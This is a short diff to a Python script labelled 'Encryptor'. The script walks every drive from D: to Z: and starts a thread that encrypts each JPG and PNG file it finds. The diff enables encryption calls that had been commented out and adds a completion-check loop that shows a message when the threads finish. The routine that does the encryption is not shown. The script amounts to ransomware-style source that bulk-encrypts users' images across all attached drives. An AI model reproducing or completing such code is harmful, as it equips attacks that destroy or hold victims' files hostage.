@@ -1,4 +1,5 @@
-import base64, os, tkinter
+import base64, os, tkinter, threading
+from time import sleep
 from tkinter import messagebox as msg
 from threading import Thread as thread
 from os import rename as rn
@@ -43,17 +44,22 @@ def driverun(root):
             ext = PATH.split('.')[-1]
             if ext.lower() == 'jpg' or ext.lower() == 'jpeg' or ext.lower() == 'png':
                 print(PATH)
-                #enc(PATH)
                 thread(target=enc, args=(PATH,)).start()
         for name in DIR:
             PATH = os.path.join(ROOT, name)
             #operations with direstories
 
+def chk():
+    sleep(1)
+    if threading.active_count() == 1:
+        msg.showinfo(title='Encryptor',message='Encryption Completed')
+    else:
+        chk()
+
 dr = [chr(i) for i in range(ord('D'), ord('Z')+1)]
 drives = [d+':\\' for d in dr if os.path.exists(f'{d}:')]
 
 for i in drives:
-    #driverun(i)
     thread(target=driverun, args=(i,)).start()
-    
-msg.showinfo(title='Encryptor',message='Encryption Completed')
+
+chk()
